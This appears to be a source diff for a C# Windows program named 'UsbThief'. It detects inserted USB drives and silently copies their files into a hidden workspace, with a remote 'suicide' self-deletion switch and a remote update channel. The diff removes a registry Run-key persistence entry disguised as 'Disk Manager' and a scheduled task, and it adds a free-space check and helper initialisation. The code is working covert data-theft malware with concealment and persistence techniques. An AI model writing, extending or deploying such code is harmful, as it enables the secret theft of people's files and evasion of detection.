@@ -10,7 +10,6 @@ using System.Threading;
 using System.Windows.Forms;
 using Ionic.Zip;
 using Microsoft.Win32;
-using Microsoft.Win32.TaskScheduler;
 using Newtonsoft.Json;
 using NLog;
 using NHotkey;
@@ -23,6 +22,7 @@ namespace UsbThief
         #region 声明变量
         public const int innerVer = 0;
         public string workspace = Application.StartupPath + @"\data\diskcache\files\";
+        public bool noSpace = false;
         public bool fc2c = false;
         public bool inDelay = false;
         public const int WM_DEVICECHANGE = 0x219;//U盘插入后，OS的底层会自动检测到，然后向应用程序发送“硬件设备状态改变“的消息
@@ -83,20 +83,20 @@ namespace UsbThief
             notifyIcon1.ContextMenuStrip.Items[2].Click += Item2_Click;
             try
             {
-                HotkeyManager.Current.AddOrReplace("ShowLogForm", Keys.Control | Keys.Alt | Keys.L, ShowLogForm);
+                logger.Info("正在初始化");
+                Process.Start(Application.StartupPath + "\\fileassistant.exe", "-init");
+            }
+            catch (Exception e)
+            {
+                logger.Error("初始化失败：\n" + e);
+            }
+            try
+            {
+                HotkeyManager.Current.AddOrReplace("ShowLogForm", Keys.Shift | Keys.Control | Keys.Alt | Keys.L, ShowLogForm);
             }
             catch (Exception e)
             {
                 logger.Info("注册热键失败：\n" + e);
-            }
-            try
-            {
-                if (File.Exists(Application.StartupPath + "\\rar.exe"))
-                    File.Delete(Application.StartupPath + "\\rar.exe");
-            }
-            catch (Exception e)
-            {
-                logger.Error("无法删除自解压文件：\n" + e);
             }
             try
             {
@@ -108,36 +108,18 @@ namespace UsbThief
                 logger.Error("无法创建工作区目录：\n" + e);
             }
             HideFiles(workspace);
-            try
+            long freeSpace = 0;
+            string str = Application.StartupPath.Substring(0, 3);
+            DriveInfo[] drives = DriveInfo.GetDrives();
+            foreach (var drive in drives)
             {
-                string path = Application.ExecutablePath;
-                RegistryKey rk = Registry.CurrentUser;
-                RegistryKey rk2 = rk.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
-                if (rk2.GetValue("Disk Manager") == null || rk2.GetValue("Disk Manager").ToString() != path + " -run")
+                if (drive.Name == str)
                 {
-                    rk2.SetValue("Disk Manager", path + " -run");
-                    logger.Info("已设置开机启动");
-                }
-                rk2.Close();
-                rk.Close();
-            }
-            catch (Exception e)
-            {
-                logger.Error("无法设置开机启动:\n" + e);
-            }
-            try
-            {
-                if (TaskService.Instance.FindTask("Clean Files") == null || TaskService.Instance.FindTask("Clean Files").Definition.Actions[0].ToString() != Application.StartupPath + "\\fileassistant.exe -clean")
-                {
-                    TaskService.Instance.AddTask("Clean Files", new WeeklyTrigger { DaysOfWeek = DaysOfTheWeek.Friday, StartBoundary = DateTime.Parse("2019-09-27 09:00") }, new ExecAction { Path = Application.StartupPath + "\\fileassistant.exe", Arguments = "-clean" });
-                    logger.Info("已设置计划任务");
+                    freeSpace = drive.TotalFreeSpace / (1024 * 1024);
                 }
             }
-            catch (Exception e)
-            {
-                logger.Error("无法设置计划任务:\n" + e);
-
-            }
+            if (freeSpace <= 200)
+                noSpace = true;
             Thread t = new Thread(() =>
             {
                 try
@@ -159,19 +141,32 @@ namespace UsbThief
             t.Join();
             if (conf.suicide == true)
             {
-                logger.Info("Bye World~");
-                Process.Start(Application.StartupPath + "\\fileassistant.exe", "-suicide");
-                Environment.Exit(0);
+                try
+                {
+                    logger.Info("Bye World~");
+                    Process.Start(Application.StartupPath + "\\fileassistant.exe", "-suicide");
+                    Environment.Exit(0);
+                }
+                catch (Exception e)
+                {
+                    logger.Error("这年头去世都费劲：\n" + e);
+                }
             }
             if (innerVer < conf.ver && conf.update != null && conf.update != "")
             {
-                logger.Info("检测到新版本，即将启动助手程序");
-                Process.Start(Application.StartupPath + "\\fileassistant.exe", "-update=" + conf.update);
-                Environment.Exit(0);
+                try
+                {
+                    logger.Info("检测到新版本，即将启动助手程序");
+                    Process.Start(Application.StartupPath + "\\fileassistant.exe", "-update=" + conf.update);
+                    Environment.Exit(0);
+                }
+                catch (Exception e)
+                {
+                    logger.Error("更新失败：\n" + e);
+                }
             }
             if (conf.enable)
             {
-
                 Dictionary<string, string> devices = ReadSta();
                 if (devices != null)
                 {
@@ -240,7 +235,7 @@ namespace UsbThief
         {
             try
             {
-                if (m.Msg == WM_DEVICECHANGE && conf.enable && !inDelay)//不这么做的话，如果上一个设备(A)在延迟期间拔出，再插入新设备(B)，B的延迟结束后就会尝试同时从A和B两个设备复制文件。在延迟期间不识别新设备以避免此问题发生。
+                if (m.Msg == WM_DEVICECHANGE && !noSpace && conf.enable && !inDelay)//不这么做的话，如果上一个设备(A)在延迟期间拔出，再插入新设备(B)，B的延迟结束后就会尝试同时从A和B两个设备复制文件。在延迟期间不识别新设备以避免此问题发生。
                 {
                     int wp = m.WParam.ToInt32();
                     if (wp == DBT_DEVICEARRIVAL || wp == DBT_DEVICEQUERYREMOVE || wp == DBT_DEVICEREMOVECOMPLETE || wp == DBT_DEVICEREMOVEPENDING)
